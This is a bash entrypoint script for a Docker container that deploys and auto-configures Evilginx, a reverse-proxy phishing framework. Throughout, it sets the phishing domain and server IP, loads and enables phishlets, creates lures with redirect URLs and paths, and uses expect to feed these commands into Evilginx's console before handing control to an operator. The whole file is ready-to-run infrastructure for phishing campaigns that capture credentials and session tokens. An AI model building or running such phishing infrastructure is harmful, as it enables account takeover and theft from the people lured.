#!/bin/bash
set -e

CONFIG_DIR="/root/.evilginx"
LOG_DIR="/app/logs"
SETUP_SCRIPT="${CONFIG_DIR}/setup.cfg"

mkdir -p "${LOG_DIR}"

# ---------------------------------------------------
# Generate Evilginx REPL commands from env vars.
# These get fed into the REPL automatically via expect.
# ---------------------------------------------------
generate_config() {
    cat > "${SETUP_SCRIPT}" <<EOF
config domain ${BASE_DOMAIN}
config ipv4 ${SERVER_IP}
config redirect_url ${REDIRECT_URL}
blacklist unauth
EOF

    if [ -n "${PHISHLET_NAME}" ] && [ -n "${PHISHLET_HOSTNAME}" ]; then
        cat >> "${SETUP_SCRIPT}" <<EOF
phishlets hostname ${PHISHLET_NAME} ${PHISHLET_HOSTNAME}
phishlets enable ${PHISHLET_NAME}
EOF
    fi

    if [ -n "${PHISHLET_NAME}" ]; then
        echo "lures create ${PHISHLET_NAME}" >> "${SETUP_SCRIPT}"
        if [ -n "${LURE_REDIRECT_URL}" ]; then
            echo "lures edit 0 redirect_url ${LURE_REDIRECT_URL}" >> "${SETUP_SCRIPT}"
        fi
        if [ -n "${LURE_PATH}" ]; then
            echo "lures edit 0 path ${LURE_PATH}" >> "${SETUP_SCRIPT}"
        fi
    fi

    echo "[*] Generated setup config:"
    cat "${SETUP_SCRIPT}"
}

# ---------------------------------------------------
# Merge default (upstream) + custom phishlets into the
# evilginx data dir. Customs are applied second so they
# override a bundled phishlet with the same filename.
# ---------------------------------------------------
setup_phishlets() {
    local default_count custom_count
    default_count=0
    custom_count=0

    if compgen -G "/app/phishlets-default/*.yaml" > /dev/null; then
        cp /app/phishlets-default/*.yaml "${CONFIG_DIR}/phishlets/" 2>/dev/null || true
        default_count=$(ls /app/phishlets-default/*.yaml 2>/dev/null | wc -l)
    fi
    echo "[*] Loaded ${default_count} default phishlet(s) from /app/phishlets-default"

    if compgen -G "/app/phishlets/*.yaml" > /dev/null; then
        cp /app/phishlets/*.yaml "${CONFIG_DIR}/phishlets/" 2>/dev/null || true
        custom_count=$(ls /app/phishlets/*.yaml 2>/dev/null | wc -l)
    fi
    echo "[*] Loaded ${custom_count} custom phishlet(s) from /app/phishlets (overrides)"
}

# ---------------------------------------------------
# Main
# ---------------------------------------------------
echo "==========================================="
echo " Evilginx Docker Infrastructure"
echo " Domain:   ${BASE_DOMAIN}"
echo " IP:       ${SERVER_IP}"
echo " Phishlet: ${PHISHLET_NAME}"
echo "==========================================="

mkdir -p "${CONFIG_DIR}/phishlets"
setup_phishlets
generate_config

echo "[*] Starting Evilginx (auto-applying config from .env)..."

# Use expect to:
#   1. Spawn evilginx as PID 1
#   2. Wait for the REPL to be ready (phishlet table border)
#   3. Feed each line from setup.cfg
#   4. Hand off to interactive mode (docker attach)
cat > /tmp/autoconfig.exp <<EXPEOF
#!/usr/bin/expect -f
set timeout 120

spawn evilginx -p ${CONFIG_DIR}/phishlets -debug

# Wait for the phishlet status table (last thing before the REPL prompt)
expect {
    "+-----" {}
    timeout { puts "\[!\] Timed out waiting for startup"; exit 1 }
}

sleep 1

# Feed setup commands from the generated config
set f [open "${SETUP_SCRIPT}" r]
while {[gets \$f line] >= 0} {
    if {\$line ne ""} {
        send "\$line\r"
        sleep 1
    }
}
close \$f

puts "\n\[+\] Auto-config applied. REPL is live — attach with: docker attach evilginx"

# Hand control to the operator's terminal (docker attach)
interact
EXPEOF

exec expect /tmp/autoconfig.exp
